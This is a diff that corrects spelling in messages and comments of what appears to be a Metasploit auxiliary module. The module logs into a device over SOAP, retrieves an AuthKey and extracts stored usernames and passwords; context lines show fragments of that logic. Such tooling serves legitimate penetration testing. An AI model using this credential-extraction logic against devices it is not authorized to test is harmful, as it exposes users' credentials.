@@ -130,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
       'data'   => '<SOAP-ENV:Envelope></SOAP-ENV:Envelope>'
     }, datastore['TIMEOUT'].to_i)
     if response.nil?
-      print_error("No reponse from device")
+      print_error("No response from device")
       return
     else
       xml0_body = ::Nokogiri::XML(response.body)
@@ -148,7 +148,7 @@ class MetasploitModule < Msf::Auxiliary
   # This section logs on and retrieves AuthKey token
   def login(major, minor)
     authreq_xml = generate_authkey_request_xlm(major, minor)
-    # Send post request with crafted XML to login and retreive AuthKey
+    # Send post request with crafted XML to login and retrieve AuthKey
     begin
       response = send_request_cgi(
       {
@@ -157,7 +157,7 @@ class MetasploitModule < Msf::Auxiliary
         'data'   => authreq_xml.to_xml
       }, datastore['TIMEOUT'].to_i)
       if response.nil?
-        print_error("No reponse from device")
+        print_error("No response from device")
         return
       else
         xml1_body = ::Nokogiri::XML(response.body)
@@ -173,7 +173,7 @@ class MetasploitModule < Msf::Auxiliary
   # This section post xml soap message that will extract usernames and passwords
   def extract(major, minor, authkey)
     if (authkey != '')
-      # create xml request to extract user credintial settings
+      # create xml request to extract user credential settings
       smbreq_xml = generate_pwd_request_xlm(major, minor, authkey)
       # Send post request with crafted XML as data
       begin
@@ -184,7 +184,7 @@ class MetasploitModule < Msf::Auxiliary
           'data'   => smbreq_xml.to_xml
         }, datastore['TIMEOUT'].to_i)
         if response.nil?
-          print_error("No reponse from device")
+          print_error("No response from device")
           return
         else
           xml2_body = ::Nokogiri::XML(response.body)
